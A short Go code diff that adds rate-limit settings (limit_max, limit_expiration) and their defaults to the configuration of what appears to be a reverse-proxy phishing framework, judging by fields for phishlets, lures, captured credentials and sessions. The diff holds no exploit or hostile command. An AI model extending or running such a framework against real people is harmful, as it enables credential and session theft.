@@ -37,6 +37,8 @@ type appConfig struct {
 	CredsFile            string          `koanf:"creds_file"`
 	SessionsFile         string          `koanf:"sessions_file"`
 	LuresFile            string          `koanf:"lures_file"`
+	LimitMax             int             `koanf:"limit_max"`
+	LimitExpiration      time.Duration   `koanf:"limit_expiration"`
 	DomainNameWithPort   string
 	Phishlet             *phishletConfig
 	APIHostname          string
@@ -99,6 +101,8 @@ func newAppConfig(configs ...*configSource) (*appConfig, error) {
 		"creds_file":          "creds.jsonl",
 		"sessions_file":       "sessions.jsonl",
 		"lures_file":          "lures.yaml",
+		"limit_max":           400,
+		"limit_expiration":    10 * time.Second,
 	}, "."), nil)
 	if err != nil {
 		return nil, err
